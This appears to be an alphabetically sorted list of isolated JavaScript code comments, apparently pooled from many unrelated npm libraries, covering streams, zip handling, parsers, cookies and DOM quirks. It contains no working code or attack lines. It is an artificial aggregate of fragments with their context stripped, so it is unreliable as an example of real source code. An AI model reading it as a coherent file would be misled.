// contained any escape sequences. This is needed because words with
// container
// containing multiple / chars.
// containing specific `key:value` pairs.
// contains buffers or objects.
// content fuzzy matches (last in results)
// content of the page will be written to the file
// content starts with value (first in results)
// content type is always returned
// content-length
// content-type
// content-type bug: https://code.google.com/p/chromium/issues/detail?id=408120"
// context
// context for applying state classes
// context for binding scroll events
// context to attach popups
// context to predict whether a regular expression is allowed in a
// context used for state
// context_menu.loadStruct(this.getPath('host_menu.json'));
// context_menu.setIconsPath('./codebase/imgs/');
// continuation bit is marked.
// continuation bit. The continuation bit tells us whether there are more
// continuation:
// continue an expression (like the body of a string).
// continue jumps to that label.
// continue to.
// continue using the old builder function.
// continuing only obscures problems.
// control user notifications
// convert all headers to arrays.
// convert array buffers and typed array views into buffers
// convert data descriptor
// convert escape sequence in a CSS string or identifier
// convert external file attr int into a fs stat mode int
// convert from many types to a Buffer
// convert it into an async function
// convert single codepoint to UTF-16 encoding
// convert single codepoint to string
// convert the expected length to an integer
// convert the limit to an integer
// convert to IDN if any non-ASCII characters
// convert to an old-style stream.
// convert to serialized 'raw' cookies
// converted to a scientific notation string.
// cool: because you can call this method at any point in the
// copied from goog.string.regExpEscape in the Closure library.
// copy arguments
// copy current col value into previous (in preparation for next iteration)
// copy from properties
// copy indexed properties from internal array
// copy last col value into previous (in preparation for next iteration)
// copy of this software and associated documentation files (the
// copy the data into the new allocation
// core zlib. We override .flush() temporarily to intercept that and
// correct value when it hasn't been explicitly set
// correctly by default.
// correspond to encoded bytes (if 128 - then lower half is ASCII). 
// corresponding driver method until localForage is ready. These stubs
// corresponding to those offsets
// corrupt its internal state.
// could have been passed in originally. This generated URI is used
// count buffered requests
// count equals to 3
// count equals to 4
// cover
// covering:
// covers:
// create SWF
// create a cargo object with payload 2
// create a copy so we don't cause conflicts with
// create a queue object with concurrency 2
// create a zero-filled buffer (safe)
// create an instance of the `HttpProxyAgent` class with the proxy server information
// create an instance of the `HttpsProxyAgent` class with the proxy server information
// create an instance of the `PacProxyAgent` class with the PAC file location
// create an instance of the `SocksProxyAgent` class with the proxy server information
// create an uninitialized buffer (potentially unsafe)
// create anonymous resource
// create circular reference
// create dynamic stylesheet + get a global reference to it
// create error
// create fake element to determine display state
// create form-data object
// create it for us if it doesn't exist.
// create json object with ciphertext
// create or extend NW namespace
// create the error object
// create xmlns
// createData()
// creates a new Buffer containing ASCII bytes
// criterion.
// cross-browser compatiblity functions ////
// crude way to check if we should resume
// css animation to use
// curlyLastIndex ensures each token is pushed or popped exactly once
// current array.
// current node) and passes them to the callback as third parameter
// currentTarget is set when dispatching; no use in copying it here
// currently fixed bottom
// currently fixed top
// currently share these stateful modules.
// custom filename take precedence
// custom filepath for relative paths
// custom header specified (as string)?
// customized sort function
// cyan
// cycle to simulate higher resolution clock
// d. LOAD_AS_FILE(M)
// d. Let pjson be the result of READ_PACKAGE_JSON(packageURL).
// d. Let resolvedTarget be the URL resolution of the concatenation of packageURL and target.
// d. Return resolved.
// d. let I = I - 1
// d0
// d0 - d7
// d8 - df
// darhs
// dashdash option spec with a bogus 'type'.
// data = link path of next file
// data = path of next file
// data from the HTML5 data-* attribute
// data halfway through streaming a response.
// data is being processed.
// data is invalid
// data is the result of parsing the text.
// data that might've been store with a camelCased key.
// data that will
// data will be read as a single chunk and emitted synchronously in a single
// data-* attributes should be lowercase; suggest the lowercase version
// database.
// databass
// date-time parsing constants (RFC6265 S5.1.1)
// date-time: http://tools.ietf.org/html/rfc3339#section-5.6
// date: http://tools.ietf.org/html/rfc3339#section-5.6
// dbMask
// db[key] = undefined;
// deadline
// debounced at least once.
// debug content outputted to console
// debug data includes performance
// debug output
// decimal number starts with '0' such as '09' is illegal.
// decision is made according to the final-letters scores maintained and Both
// declarations
// declarations create bindings in the outer scope.
// declare function(a: B): void; OR
// decode an encoded blob
// decode domain name parts
// decode domain names
// decode email addresses
// decode the last character properly.
// decode upon decompressing with captured encoding
// decompressed data as it is received
// deep directory trees.
// deep extended (see ajaxExtend)
// deep referencing
// deeply mutated and reused.
// def
// default async is asap;
// default chars
// default highWaterMark value
// default is not recursive
// default mode for dirs created as parents
// default options
// default order
// default position relative to element
// default size is 300x150 in Gecko and Opera
// default text/* to utf-8
// default to Connection:keep-alive.
// default to http://
// default to json
// default to true for now
// default to x-www-form-urlencoded
// default true for root
// default values
// default: use aws-sign2
// defaults to Infinity
// defaults to US-ASCII only if type is not provided
// defaults to document
// defaults to x-www-form-urlencoded
// defer call
// defer further parser to one of its callers when it encounters an
// defer onattribute events until all attributes have been seen
// defer the callback if we are being called synchronously
// deferred from S5.3
// deferred[ done | fail | progress ] for forwarding actions to newDefer
// deferred[ resolve | reject | notify ]
// define all public properties here
// define like this to please codeintel/intellisense IDEs
// define namespace
// define namespaces for modules
// defined in the class body.
// definitions for automatic type detection
// del (gfm)
// delay before event
// delay before hiding menu after blur
// delay before searching
// delay between animations in group
// delay between attempts so that we'll retry these jobs sooner
// delay in ms for fail safe
// delay in ms for fail safe animation callback
// delay used to prevent accidental refiring of animations due to user error
// delayed syntax error at correct position).
// delegated event context
// delete accessors for all frames
// delete restores the original property definition
// delete the entry (recursively) according to its type
// delete the last-seen occurrence.
// delete this.manager.cache[path];
// deleteData leaves an empty `TextNode` which offsets the index of all
// deleted when data is removed
// deleted with the delete operator
// deletion
// delimited string
// delimiter at the beginning of the data
// delimiter key
// depending on the implementation; some applications substitute
// depending on their creation NAMESPACE in createElementNS()
// depends on are still spread into arguments.
// deprecated
// deprecating this convenience.
// deps is a config object
// descending for length: b CMP a
// descending order
// designed to be sync/async agnostic.
// dest in this case would result in removing src contents
// dest will only emit one 'drain' event for the multiple writes.
// destroyed (in event handlers).
// destruction of top-level components is guarded in ReactMount.)
// detect IE bug with dynamic attributes
// detect IE bug with non-standard boolean attributes
// detect IE gEBTN comment nodes bug
// detect Opera browser
// detect Opera gEBCN second class and/or UTF8 bugs as well as Safari 3.2
// detect Safari bug with selected option elements
// detect buggy gEBID
// detect if DOM methods are native in browsers
// detect native methods
// detectIncompleteChar determines if there is an incomplete UTF-8 character at
// detection and lead to arbitrary writes to anywhere on the system.
// determine and set charLength / charReceived
// determine exact animation
// determine how many bytes we have to check at the end of this buffer
// determine how many remaining bytes this buffer has to offer for this char
// determine tab context
// determined by having the same number of owned properties (as verified
// determiner: 'must be' or 'must not be'
// determines popup state
// developer error
// diacritics and additional 'Yiddish' ligature letters in the range 0xc0-0xd6.
// didn't increment anything
// different delays (in ms) per item
// different than another field
// different types of agents are in different pools
// digits in this value following this digit.
// dir name starts with __MACOSX/
// directly after the root.
// directly represent `beforeInput`. The IE `textinput` event is not as
// directly start an expression (like a quotation mark) or can
// directly.
// directory
// directory file names end with '/'
// directory is >= 1.
// disable cookies
// disable truncating
// disabled by default for performance
// disabled with `removeAttribute`.
// disabled?
// disastrous mistake of forgetting to traverse a subtree. Also
// discard start
// disconnected or equal:
// displayed dropdown text
// displayed text when selected
// dispose of the old one before overwriting
// distance away from activating element in px
// distinguish between parens-free and paranthesized single param.
// do NOT remove this file - it would break pre-compiled schemas
// do `new Pack(opt).add('files').add('dir').end().pipe(output)
// do delete on constant value (not considering identifier in this tree based constant folding)
// do extended autolink path validation
// do not copy if src is a subdir of dest since unlinking
// do not edit .js files directly - edit src/index.jst
// do not modify the original
// do not set mtime/atime of extracted entries
// do not trigger if the window is closed
// do not unpack over ANY files
// do not unpack over files that are newer than what's in the archive
// do not use inline function because that will leak memory
// do nothing
// do nothing special yet
// do some more stuff ...
// do some more stuff but error ...
// do some stuff ...
// do something
// do something with the result
// do something with the results
// do stuff...
// do this. *SIGH*
// do what the spec says regarding anchor tags: just don't parse it
// doc is the document Mars
// doc's origin is an alias to the origin of the context object's associated
// doc2 or doc3 was modified. Since we sort on _id and it is random
// docs contains Earth
// docs contains Earth and Jupiter
// docs contains Earth and Mars
// docs contains Mars
// docs contains Mars (the Earth document is not complete!)
// docs contains Mars and Earth
// docs contains Mars. Result would have been the same if query had been { satellites: 'Deimos' }
// docs contains Omicron Persei 8
// docs contains document 5
// docs contains only Mars
// docs contains the two planets Earth and Mars
// docs is an array containing document Earth only
// docs is empty
// docs is empty since Phobos and Deimos are after Amos in lexicographical order
// docs only contains Mars because Earth was excluded from the match by $nin
// docs with more than 6 properties
// document can contain conflicting elements (id/name)
// document context is mandatory no checks
// document is undefined in react-native: https://github.com/facebook/react-native/pull/1632
// document order:"
// documentElement is verified for cases where it doesn't yet exist
// does it match the regex?
// does not consider hidden input fields
// does not help.
// doesn't expect a non-string/function type and can throw confusing errors.
// dom properties selector (extension)
// don&#39;t override this one; use DNS as normal
// don't add a new line if there are leading coments
// don't add in empty properties
// don't buffer it up or send it to the decoder
// don't close on clicks inside popup
// don't continue searching if a result is found
// don't emit close before 'end' and 'finish'
// don't forget to bind to console!
// don't leak
// don't let the internal resume be overwritten
// don't load remote content on first load
// don't lose time with error prone cases
// don't need to count symbols here since we check ASCII values
// don't override this one; use DNS as normal
// don't process rest of the results
// don't repeat yourself
// don't reset if already set
// don't run into trouble passing this.options around.
// don't show up in prod but only in __DEV__
// don't skip over falsy values in objectMode
// don't want to throw if we can't find the source - we just want to
// done here
// done with it.
// done with metadata
// dont add already expired items
// double check webkit in userAgent just in case we are in a worker
// double doubleValue()
// down arrow (open menu)
// down arrow (traverse menu down)
// down to pre-release. premajor and prepatch work the same way.
// draft-preston-ftpext-deflate-04 says min of 8 should be supported
// drain event flag.
// draws it from left to right. The text itself when ordered naturally is read
// drive letter.
// drive-specific relative paths on Windows get their root stripped off even
// driver even if another is available. You can
// drivers. See: https://github.com/mozilla/localForage/pull/42
// duplicate argument names. checkClashes is ignored if the provided construct
// duplicating this one unless they are a getter
// duplicating this one unless they are a setter
// duration for error state
// duration for loading state
// duration is actually callback
// duration is actually settings object
// duration of animation
// duration of transition
// during a given window of time.
// dynamic attributes that needs to be checked against original HTML value
// dynamic publishing
// dynamic type safety.
// e
// e. Assert: resolvedTarget is contained in packageURL.
// e. LOAD_INDEX(M)
// e.g. '&#123;'
// e.g. '&#x41;'
// e.g. '&#x41;' becomes just '#x41'
// e.g. 'setEnabled(false)'.
// e.g. --opt
// e.g. --opt=val
// e.g. -a
// e.g. -abc
// e.g. foo
// e.g. search-cluster-name-aaaa00aaaa0aaa0aaaaaaa0aaa.us-east-1.es.amazonaws.com
// e.g. var i = 1;
// e.g. { /*dangling*/ }.
// e0
// e0 - e7
// e8 - ef
// each buffer size
// each category
// each code range there as well. So it is safe to set it to be
// each item inside category
// each result
// eachOf implementation optimized for array-likes
// easily accessed on elements. E.g. `<Foo />.type === Foo`.
// easing equation for animation
// easy to recognize.
// ecma-262 14.6 Class Definitions
// effect begins to be felt only after several operations etc.)
// effect the current flags. This means the production the parser parses is only used as an expression. Therefore
// effect.
// effectively removing all parallelization on windows.
// either a TCP-level error OR an FTP-level error response that we get when
// either a length or a percent
// either cached or retrieved from the source
// either resolves or rejects depending on the first value to do so
// el.getContext().setHeight_(attrs.height.nodeValue);
// el.getContext().setWidth_(attrs.width.nodeValue);
// elapsedTime includes all redirects
// elegant way to allow for the emptyArray one always to give a new
// elem.tabIndex doesn't always return the
// element by id
// element by id (raw)
// element created in the earlier step.
// element created in the previous step.
// element indexing methods
// element inspection methods
// element of the array.
// element root of the document
// element selection methods
// element that creates request
// element that has no children
// element to use to determine if popup is out of boundary
// element which is launching popup
// element which popup should be relative to
// element. Make sure we always return the smallest of these.
// elements by class
// elements by class (raw)
// elements by tag
// elements by tag (raw)
// ellipses
// else
// else `err` will be an Error with the code 'ETIMEDOUT'
// else next test will carry the responsibility
// else willDeleteListener gets called when there wasn't actually a
// else.
// else: stay in AFTER_COMMENT_2 (`--->`)
// elsewhere)
// em
// em-dashes
// email (sources from jsen validator):
// emit 'drain' before the write() consumer gets the 'false' return
// emit 'readable' now to make sure it gets picked up.
// emit a single compressed chunk some time in the future.
// emit an error with process.nextTick
// emit deprecation if listeners exist
// emit namespace binding events
// emit prefinish if the only thing we're waiting for is _write cbs
// empty constructor function at the top (same line as the class keyword)
// empty function handler
// empty header field
// empty or either doesn't have path or not an http response
// empty string to avoid regexp issues
// empty the cache
// emulate ES5 getter/setter API using legacy APIs
// en-dashes
// enable / disable colors in the output (reporters and logs)
// enable / disable watching file and executing tests whenever any file changes
// enable stack on error
// enable/disable cache
// enable/disable context caching system
// enabled:
// enabled: Buffer.from(editor.session.getValue()).toString('base64') !=
// encode a blob for indexeddb engines that don't support blobs
// encode domain name parts
// encode domain names
// encode email addresses
// encode-decode-image-with-base64-breaks-image (2013-04-21)
// encodeURIComponent('&#10003;')
// encoders[farr[0]].push(farr[1]); });
// encoding is 'binary' so we have to make this configurable.
// encoding/decoding from VLQ.
// encr_data in fileenc.c from  Dr Brian Gladman's counts only with DWORD j < 8
// end
// end of expression
// end of prefiltering pass
// end of the comments. Note that you are not allowed to call the
// end of token
// end transition
// end up in an overlapped onwrite situation.
// end)` parameters whenever a comment is skipped. `block` is a
// ending EOL
// enforce Object.is +0 !== -0
// enough to ensure DOMNodeInserted/DOMNodeRemoved exist
// enough to fill the longest string we've got
// enqueueUpdates.
// ensure parent directory exists
// ensure that every cell-delimiting pipe has a space
// ensure the response is being consumed
// ensures that source is a string
// enter (select or open sub-menu)
// entire hostname (including the delimiting dots) has a maximum of 255 chars.
// entry which is being consumed (readEntry).
// env-specific initialization logic for debug instances
// eocdr means End of Central Directory Record.
// epoch seconds
// equal for testing purposes and therefore we hide it from enumeration.
// equal to 'value'
// equal to the interval at which your server sends out pings plus a
// equivalence is determined by ==.
// equivalent to this check.
// err is a 'uniqueViolated' error
// err is null
// err is { errorType: 'uniqueViolated'
// error
// error and close are only events allowed after calling destroy()
// error closing the fd
// error getting decoder
// error if no matches found by the pattern scan
// error in IE
// error status code.
// error.
// errorThrown set to true before setting it to false after calling
// errors
// errors on any property access that is not readyState
// errors will abort the retry control flow and return to final callback
// errors.
// errs on the side of fewer warnings
// escape
// escape (close menu)
// escape regex characters
// escape sequence with a single ASCII symbol to avoid throwing on
// escape sequences in strings
// escape sequences must not be interpreted as keywords.
// eslint-disable-line camelcase
// eslint-disable-line consistent-return
// eslint-disable-line func-name-matching
// eslint-disable-line func-style
// eslint-disable-line handle-callback-err
// eslint-disable-line no-eval
// eslint-disable-line no-lonely-if
// eslint-disable-line no-param-reassign
// eslint-disable-line no-proto
// eslint-disable-line no-restricted-syntax
// eslint-disable-line no-self-assign
// eslint-disable-line no-sparse-arrays
// eslint-disable-line no-undef
// eslint-disable-next-line @typescript-eslint/no-namespace
// eslint-disable-next-line camelcase
// eslint-disable-next-line complexity
// eslint-disable-next-line consistent-return
// eslint-disable-next-line global-require
// eslint-disable-next-line import/no-extraneous-dependencies
// eslint-disable-next-line max-len
// eslint-disable-next-line new-cap
// eslint-disable-next-line no-control-regex
// eslint-disable-next-line no-invalid-this
// eslint-disable-next-line no-new
// eslint-disable-next-line no-new-func
// eslint-disable-next-line no-restricted-syntax
// eslint-disable-next-line no-shadow
// eslint-disable-next-line no-unused-vars
// eslint-disable-next-line node/no-deprecated-api
// eslint-disable-next-line node/no-unsupported-features/node-builtins
// eslint-disable-next-line prefer-rest-params
// especially useful for `global.should = require('chai').should()`.
// etc.
// etc. match the value.
// even if it doesn't parse.
// even if we're not reading.
// even though it's within the range set by the comparators.
// event binding
// event emitter implementation with them.
// event emitter.
// event namespace
// event on title that opens accordion
// event to bind to
// event.
// events get enqueued while processing.
// events so we don't include them here
// events that mean 'the stream is over'
// everyone wants their own white-labeled json
// example) becomes xmlDefaultDeclaration.
// except in the very rare event of the first time database is loaded and a crash happens
// exception and abort these steps:
// exception: <1.2.3-0 is the same as <1.2.3
// exceptions that might be thrown later in the traversal.
// exceptions will propagate without being intercepted and
// excess is a negative index
// exclude backslash (\)
// exclude backslash (\) and add hyphen (-)
// exec state machine
// execute test and hook(s)
// exercise fn for 100% coverage
// existing? convert to array
// exists a version which can satisfy it
// exists for pushing a zero-length chunk into state.buffer
// exists.
// exit conditions
// exit conditions if no source
// exit program with non-zero exit code
// expire DOM tree cache
// expire complete cache
// explicit exceptions above if this proves overzealous.
// explicit message
// explicitly
// explicitly define this method as function as to have it's name to include as `ssfi`
// explicitly if it's the first character.
// explicitly set content
// explicitly set html
// explicitly set title
// explicitly specify the names of the parameters your task function needs
// exponent1 -- d mod (p1)
// exponent2 -- d mod (q-1)
// exponentiation operator ** and **=
// export * FromClause ;
// export * from '...'
// export * from 'foo';
// export <*> from ...;
// export Declaration[Default]
// export ExportClause ;
// export ExportClause[NoReference] FromClause ;
// export VariableStatement
// export default (1 + 2);
// export default ...
// export default AssignmentExpression[In] ;
// export default Base;
// export default Database;
// export default FileManager;
// export default Files;
// export default Folder;
// export default HoistableDeclaration[Default]
// export default Tasks;
// export default Terminal;
// export default [];
// export default async function () {}
// export default async function f () {}
// export default async x => x
// export default class foo {}
// export default class {}
// export default function () {}
// export default function foo () {}
// export default {};
// export the constructor
// export validators REs
// export var f = 1;
// export var|const|let|function|class ...
// export version string
// export {<id [as name]>} [from ...];
// export {default} from 'foo';
// export {default}; // missing fromClause
// export {foo} from 'foo';
// export {foo};
// exported async module functions ////
// expose events
// expose sort helpers
// expose the module cache
// expose the modules object (__webpack_modules__)
// exposed for testing purposes only.
// expression closure is not supported': {
// expression into the generated class name variable and use that to refer
// expression.
// expressions
// expressions and divisions. It is set on all token types that can
// extend current array
// extend returns a new object. Does not mutate arguments
// extend the Request instance with any non-reserved properties
// extend with .proxy()
// extend with Request#proxy()
// extension -> mime
// extra leading space in situations where that might
// extra rules for true
// extract flag from toString result
// extract some randomness from Math.random()
// extraction is complete. make sure to handle the err
// f. LOAD_INDEX(X) DEPRECATED
// f0
// f0 - f7
// f8 - ff
// fail querying filtered sibling combinators
// fail the first time in strict mode
// fail the render phase where it didn't fail before. So we log it.
// failed JSON success test
// fails in IE9
// failure
// failure if encountered.
// failure toggle
// fake app
// fake worker of some kind
// fakeBody required for <FF4 when executed in <head>
// fallback to querying IP locally
// fallback to the default content type if `value` is not simple value
// fallback.
// falling back to the empty string if nothing was stored.
// falls through
// falls through to AssignmentPattern
// fallthrough
// false
// false by default
// fast cases
// fast forward iteration index
// fast path needed to support multiple this.push()
// fast-path writing strings of same encoding to a stream with
// faster way of calculating u0 = x[i]*mp mod DV
// fd after it's done reading
// feature detection based on Andrea Giammarchi's solution: http://webreflection.blogspot.com/2009/01/32-bytes-to-know-if-your-browser-is-ie.html
// feature-detection
// fences (gfm)
// fetch cookie in the Specified host
// field cannot be empty so that means we should return undefined so that nothing can match
// field to display in standard results template
// fields initialized directly from builder function arguments
// fields to search
// fields.
// fieldset[disabled] * //TODO not child of first <legend>
// figure out the correct index to insert the CSS into
// file
// file entry
// file in every node's `loc` object.
// file name. Do this after creating the global so that if an AMD module wants
// filenames (strip directory paths)
// files is now a list of filenames that exist in the 3 directories
// filter out IE specific attribute
// filter out prototype additions from other potential libraries
// filter out prototype additions from other potential libraries and IE specific param element
// filtered by a selector.
// filtered out!
// filters don't waste time on unused pixels.
// final response line
// final-letter evidence suggesting the text is either logical Hebrew or visual
// find all canvas elements
// find out current char's byte length
// find tabs
// find the Zip64 Extended Information Extra Field
// find the best mapping.
// find the lowest common ancestor
// finished
// fire selectionchange normally.
// fire.
// fire. The workaround for this bug involves attaching an empty click
// fires only on input and textarea thus if there's no focused element we
// first 1024 sequences: 1.5981%
// first 1024 sequences: 2.3389%
// first 1024 sequences:1.7001%
// first 1024 sequences:3.0618%
// first 1024 sequences:5.2623%
// first 1024 sequences:7.3177%
// first 512 sequences: 92.6386%
// first 512 sequences: 94.7368%
// first 512 sequences: 96.9392%
// first 512 sequences: 97.6601%
// first 512 sequences: 98.2851%
// first 512 sequences: 98.4004%
// first before executing any more queued requests ...
// first byte
// first call to .finalize does anything.
// first car
// first case
// first check the previous Expires and/or Cache-Control headers
// first chunk is a perfect match
// first error is the one to bubble up.
// first line doesn't have indentation
// first list is a perfect match
// first make sure that the closing tag actually exists.
// first mapping ends where the second one starts).
// first node is sentinel
// first usage of CoverInitializedName and report it when we reached the end of the parentheses pair.
// first we have to figure out the Last Modified date.
// fix Safari selectedIndex property bug
// fix bug in v8
// fix for Safari 8.x and other engines that
// fixes this for us now.
// flag (restore them to their old value afterwards).
// flag abortion here for out timeouts
// flatten leftStartPos
// flatten pos
// flatten startPos
// float
// float floatValue()
// flowing again.
// flush all the data out so that we aren't left hanging
// flush function
// flush synchronously.
// flush this response - we're not going to use it
// fn can now be used as if it were slow_fn
// focus search
// focus/blur morphs to focusin/out; ensure we're not firing them right now
// foldl alias
// foldr alias
// following conditions:
// following template settings to use alternative delimiters.
// foo=bar&hello=world
// for (let chunk of stream)
// for **isSorted** to use binary search.
// for .resetTimeout()
// for Babylon. Flow parser puts it on the identifier
// for UI pseudo-classes extensions (WebForms/HTML5)
// for `window` on <=IE8
// for a server that requires digest authentication.
// for array literals).
// for attribute operators extensions
// for await (let chunk of stream)
// for cases like <td> <p> </td> - 'p' closes without a closing tag
// for cases where the parser will give a parse tree differing from what React
// for chars not in standard ascii table
// for creating a store.
// for custom option types.
// for cycle detection:
// for debugging
// for discount behavior.
// for each byte we get its class
// for each registered object element
// for each selector in the group
// for editors that break on \r\n? I don't think we care in the transformed
// for element pseudo-classes extensions
// for example:
// for getComputedStyle silently falls back to the reliable elem.style
// for headless JS engines or for standard web browsers
// for in excess whitespace removal
// for index in 0 ... obj.length
// for instance: name of the git branch
// for match method
// for more details.
// for node < 10
// for node-sets
// for non-ascii inputs.
// for objects that do not have a parent. This method limits itself only to
// for old IE which understands string indexing for string
// for pseudo-class selectors extensions
// for queue support.
// for radio buttons checkboxes (HTML4) and options (HTML5)
// for select method
// for structural pseudo-classes extensions
// for such an element
// for test
// for the TypeScript definition files in `@types/node` :/
// for the description of the bug (it existed in older Chrome versions as well).
// for the typical use of this module.
// for this option.
// for use with Node-style callbacks...
// for v0.6
// for v0.7 or later
// for width.
// for writev
// forbid the `in` operator (in for loops initalization expressions)
// force GET
// force MSB set
// force a choice on blur with search selection
// force a default depth:
// force a recalculation
// force back to text/plain
// force method
// force odd
// force selector refresh
// forced to be a string.
// form
// format
// format and write message
// format as tokenize() returns. Note that you are not
// format as tokens returned from `tokenizer().getToken()`. Note
// format. STOP
// formidable and the browser add a name property
// forward close events
// forward the event if the value has changed
// forward zlib errors to the client-visible stream
// found eocdr
// fragment in IE 9
// fragments are merged into the element (except parser-created fragments in <template>)
// frameworks to use
// free memory associated with the window
// from './language'; import AProxy from './aproxy';
// from a full path
// from different frames are.
// from es5-shim
// from getNativeNode.
// from here on
// from http://dev.w3.org/csswg/cssom/#the-linkstyle-interface
// from path.parent.node all the way to path.node by accessing each
// from the DOM node instead of inadvertently setting to a string. This
// from the `children` array. The results of `parseHTML` should remain
// from the offline store.
// from the server once connected.
// from worse whitespace behavior. Re-adding a node like this triggers
// from: https://github.com/kaielvin/jsbn-ec-point-compression
// fs- and request- streams have path property
// fs.copyFile was added in Node.js v8.5.0
// fs.lchown is not available on at least some Linux
// fs.mkdtemp was added in Node.js v5.10.0
// fs.promises is a getter property that triggers ExperimentalWarning
// fs.read will throw an out-of-bounds error if you try to read 0 bytes from a 0 byte file
// fs.read() & fs.write need special treatment due to multiple callback args
// fs.readdir could only accept an options object as of node v6
// fs.realpath.native only available in Node v9.2+
// fs:System.IO.FileStream=new
// ftp://ftp.rsa.com/pub/pkcs/ascii/layman.asc
// fudge factor in pixels when swapping from 2d to 3d (can be useful to correct rounding errors)
// full original source and name information
// full request body string
// full-date from http://tools.ietf.org/html/rfc3339#section-5.6
// function
// function as its `this` object.
// function bodies).
// function in `names`. We also add the names of the functions to the `names`
// function serves to coerce them all to actual Type objects. Note that
// function takes.
// function that interacts with a rate-limited REST api.
// function throws instead of the `http` request machinery. This is
// function to create an instance of the type.
// function(uri: string): Promise {}
// functions currently running
// functions for working with versions
// functions into account.
// gEBID returns nodes no longer in the document (#6963)
// general stuff
// general tests
// generate 5 users
// generate HTTP verb methods
// generate a new agent for this setting if none yet exists
// generate automatic message from call site
// generate code
// generated by genversion
// generated by tools/generate-identifier-regex.js
// generated file.
// generated source map.
// generates dropdown from select values
// generates just menu from select
// generates label for multiselect
// generates popup html from metadata
// generates user addition to selection menu
// generator as a root directory for relative source file paths.
// generator functions only if their body includes `CallExpressions` to
// get a 'connect' event for an already connected socket.
// get all the files to bump version in
// get an `http.Agent` instance from protocol-specific agent function
// get by cookie
// get call site
// get caller of deprecated thing in relation to file
// get content length and fire away
// get dir listing
// get drive on windows
// get encoding
// get extensions
// get full settings
// get reset if `textContent` is mutated.
// get right most selector token
// get the character that was split
// get the encoded data portion and decode URI-encoded chars
// get the original size
// get the path to the file
// get the protocol
// get the proxy `http.Agent` creation function
// get url
// get vendor specific events
// get your args like in iojs
// get/set (string/object) working modes
// getComputedStyle returns percent when specified for top/left/bottom/right;
// getElementById can match elements by name instead of ID
// getElementById is not reliable as a find shortcut
// getInitialState and componentWillMount methods for initialization.
// getLink(
// getPropertyValue is only needed for .css('filter') (#12537)
// getResponseHeader still works. so we get content-type even if getting
// gets computed margin-right based on width of container. (#3333)
// gets current displayed percentage (if animating values this is the intermediary value)
// gets it and catching keydown lets us fire an event for the first
// gets nothing!
// gets the URI of the link for the given relation based on the instance and schema
// gets us out of timeout issues and allows us to
// getter type (unsigned long index);
// getters and setters
// git://github.com/ariya/esprima.git#master.
// github.com (hostname lookups are supported with SOCKS v4a and 5)
// github.com/mozilla/localforage/pull/24#discussion-diff-9389662R158
// give up after 500ms
// given point in the program is loosely based on sweet.js' approach.
// given position.
// gives Cookie header format
// gives Set-Cookie header format
// global is originally prototype of host.Object so it can be used to climb up from the sandbox.
// global. It's extended by pulling in one of our other libraries.
// go ahead and set it now.
// goal: give my xpath object to the website's JS context.
// goes to both destinations
// good idea anyway: https://github.com/babel/babel/pull/4988
// got a match.
// got some text.  t is the string of text.
// gotta get it all in this tick
// grab data on .js files
// grab instance
// grep
// grid_host.load(
// grid_host.setIconsPath(dhtmlx.image_path);
// grid_host_log.setIconsPath('./codebase/imgs/');
// grouping for all dropdown values
// grouping for api results
// guaranteed not to match.
// guaranteed to be available.
// guaranteed to contain all the reprinted nodes and comments.
// guaranteed to not contain any partial multi-byte characters. Any partial
// hack to fix a circular dependency issue when used with browserify
// had a multi-line value.
// halt the stream on error
// hammered by dom mutations (jdalton)
// handle IE9 bug: http://stackoverflow.com/questions/10046972/msie-returns-status-code-of-1223-for-ajax-request
// handle deferred onattribute events
// handle errors
// handle functions without any code
// handle missing context in selector strings
// handle relative paths to be safe (might happen when process.cwd() fails)
// handle selector engine configuration settings
// handle spaces after the last line
// handle spaces before the first line
// handle spaces between lines
// handle the case where we change protocol from https to http or vice versa
// handleObj is passed to all event handlers
// handled it.
// handlers can run. See https://github.com/facebook/react/issues/708.
// handling at a lower level.
// handling clutter.
// hanging on the source or dest.
// happens.
// has Windows drive at beginning of path
// has forgotten the reference to `this`. We use the element instead
// has it been destroyed
// has not been initialized yet
// has side effect
// hasOwn isn't used here due to false negatives
// hasOwnProperty)
// hash of items by key
// have a trailer
// have encountered so far.
// have older IndexedDB specs; if this isn't available
// have their indexes updated to accommodate the new statement.
// have to guess callback parameters based on request success
// have to process this as a text node.
// have to set this so that streams are ok piping into it
// haven't read the attribute name yet.
// having the same number of owned properties (keys incorporates
// having to allocate a temporary object.
// header
// header + host length + host + port
// header + host length + port
// heading
// height of replaceWith is necessarily 1 because the tree was balanced before deletion
// helper/check methods
// helpful for us so just check activeElement instead.
// helps finding memory leaks.
// helps keep this simple. Named captures will be put back
// here (don't ask).
// here.
// hidden from traversal
// hidden menu
// hide all debug content
// hide all output from this component regardless of other settings
// hide and set properties read-only.
// hide other popups on show
// high byte
// high-ASCII.
// high-level commands
// historical
// hoisted class for cyclic dependency
// host names are supported with SOCKS v4a and SOCKS v5.
// how long to wait before request should occur
// how many browser should be started simultaneous
// how many bytes or characters.
// how markdown.pl works.
// howMuchToRead will see this and coerce the amount to
// hr
// html
// http
// http request
// http://bl.ocks.org/nolanlawson/raw/c83e9039edf2278047e9/
// http://blogs.msdn.com/b/ie/archive/2010/09/07/transitioning-existing-code-to-the-es5-getter-setter-apis.aspx
// http://bugs.jquery.com/ticket/12359
// http://connalle.blogspot.com/2013/10/topological-sortingkahn-algorithm.html
// http://dev.chromium.org/developers/design-documents/secure-web-proxy
// http://dev.w3.org/2006/webapi/WebIDL/#es-type-mapping
// http://dev.w3.org/csswg/css-style-attr/  not sure what's new here
// http://dev.w3.org/csswg/cssom/ (2010) Meant to replace DOM Level 2 Style
// http://dev.w3.org/csswg/cssom/#extensions-to-the-document-interface
// http://dev.w3.org/csswg/cssom/#resolved-values
// http://dev.w3.org/csswg/cssom/#stylesheetlist
// http://developer.mozilla.org/en/docs/Canvas_tutorial:Drawing_shapes
// http://docs.amazonwebservices.com/general/latest/gr/signature-version-4.html
// http://docs.aws.amazon.com/general/latest/gr/rande.html
// http://dom.spec.whatwg.org/#dom-node-parentelement
// http://ecma-international.org/ecma-262/7.0/#sec-ecmascript-function-objects-call-thisargument-argumentslist
// http://en.wikipedia.org/wiki/ANSI_escape_code#graphics
// http://en.wikipedia.org/wiki/GBK
// http://en.wikipedia.org/wiki/UTF-16 and http://encoding.spec.whatwg.org/#utf-16le
// http://fluidproject.org/blog/2008/01/09/getting-setting-and-removing-tabindex-values-with-javascript/
// http://icu-project.org/docs/papers/gb18030.html
// http://jsperf.com/emptying-a-node
// http://jsperf.com/thor-indexof-vs-for/5
// http://mathiasbynens.be/notes/javascript-encoding#surrogate-formulae
// http://moztw.org/docs/big5/  http://www.haible.de/bruno/charsets/conversion-tables/Big5.html
